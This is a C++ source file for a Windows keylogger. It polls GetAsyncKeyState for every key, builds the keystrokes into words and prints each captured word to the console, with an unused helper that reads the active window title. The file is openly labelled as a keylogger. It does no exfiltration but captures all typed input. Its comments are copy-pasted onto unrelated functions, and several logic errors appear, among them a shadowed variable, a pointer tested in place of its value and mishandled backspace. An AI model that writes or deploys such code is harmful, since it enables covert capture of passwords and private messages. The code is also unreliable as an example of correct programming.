#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <functional>
#include <atlstr.h>
#include <locale>
#include <codecvt>
/*
* Return the current pressed key or null
*/
bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '¾': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}
/*
* Infinite while loop.
*/
class Looper {
    /*
    * Return the current pressed key or null
    */
    public: static void DoWhile(int sleep, bool* keepDoing, void(*callback)())
    {
        while (keepDoing) {
            Sleep(sleep);
            callback();
        }
    }
};
/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    * public: static std::vector<std::string> words;
    */
    /*
    * Start the KeyLogger loop.
    */
    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            char character = KeyLogger::CatchChar();
            if (character == NULL) continue;
            word = KeyLogger::BuildWord(character, word, wordCallback);
            charCallback(character);
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
    {
        if (character == NULL) return word;
        if (IsWordEnder((int)character)) {
            callback(word);
            return "";
        }
        if ((int)character == VK_BACK) word.pop_back();
        return word + character;
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool IsWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char CatchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachChar(void(*callback)(char))
    {
        KeyLogger::Start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::Start([](char c){}, callback);
    }
};
/*
* Return the current pressed key or null
*/
std::string GetActiveWindowTitle()
{
    //LPSTR wnd_title;
    char wnd_title[256];
    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
    std::string name = wnd_title;
    return name;
}

int main()
{
    //bool monitor = true;
    //bool delay = 50; // 50 ms
    //Looper::DoWhile(delay, &monitor, []() {
    //    KeyLogger::ForEachWord();
    //})
    std::vector<std::string> words;
    //std::cout << GetActiveWindowTitle();
    // for (const auto& value: words) std::cout << value + char(VK_SPACE);
    KeyLogger::ForEachWord([&words](std::string word) {
        words.push_back(word);
        std::cout << word ;
    });
    return 0;
}
